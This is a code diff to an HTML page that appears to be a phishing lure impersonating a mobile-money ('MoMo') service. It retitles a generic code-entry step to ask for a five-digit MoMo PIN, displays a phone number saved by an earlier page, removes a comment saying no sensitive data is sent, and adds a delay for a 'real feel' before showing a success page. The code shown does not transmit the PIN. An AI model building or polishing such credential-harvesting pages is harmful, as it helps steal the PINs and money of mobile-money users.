@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>MoMo Step</title>
+<title>MoMo PIN</title>
 
 <style>
 body {
@@ -31,6 +31,7 @@ body {
   margin: 40px auto;
   padding: 25px;
   border-radius: 15px;
+  box-shadow: 0 4px 10px rgba(0,0,0,0.2);
 }
 
 /* INPUT */
@@ -43,6 +44,7 @@ input {
   background: #f1f1f1;
   text-align: center;
   font-size: 18px;
+  letter-spacing: 5px;
 }
 
 /* BUTTON */
@@ -54,6 +56,11 @@ button {
   border: none;
   border-radius: 10px;
   font-weight: bold;
+  cursor: pointer;
+}
+
+button:active {
+  background: #e6b800;
 }
 
 /* FOOTER */
@@ -71,13 +78,13 @@ button {
 </div>
 
 <div class="container">
-  <h3>Confirm Your Details</h3>
+  <h3>Enter MoMo PIN</h3>
 
   <p id="phoneDisplay"></p>
 
   <form id="pinForm">
-    <input type="password" placeholder="Enter Code" required>
-    <button type="submit">Continue</button>
+    <input type="password" placeholder="Enter PIN" maxlength="5" required>
+    <button type="submit">Confirm</button>
   </form>
 </div>
 
@@ -86,23 +93,25 @@ button {
 </div>
 
 <script>
-// ✅ GET DATA
+// ✅ GET PHONE FROM FIRST PAGE
 const phone = localStorage.getItem("phone");
 
-// ✅ IF NO DATA → GO BACK
+// 🔐 IF NO DATA → GO BACK
 if (!phone) {
   window.location.href = "/";
 }
 
-// SHOW PHONE
+// SHOW PHONE NUMBER
 document.getElementById("phoneDisplay").innerText = "Number: " + phone;
 
-// HANDLE SUBMIT (NO SENSITIVE DATA SENT)
+// HANDLE SUBMIT
 document.getElementById("pinForm").addEventListener("submit", function(e) {
   e.preventDefault();
 
-  // 👉 DIRECT TO SUCCESS PAGE
-  window.location.href = "/success.html";
+  // ⏳ Optional delay (real feel)
+  setTimeout(() => {
+    window.location.href = "/success.html";
+  }, 1000);
 });
 </script>
 
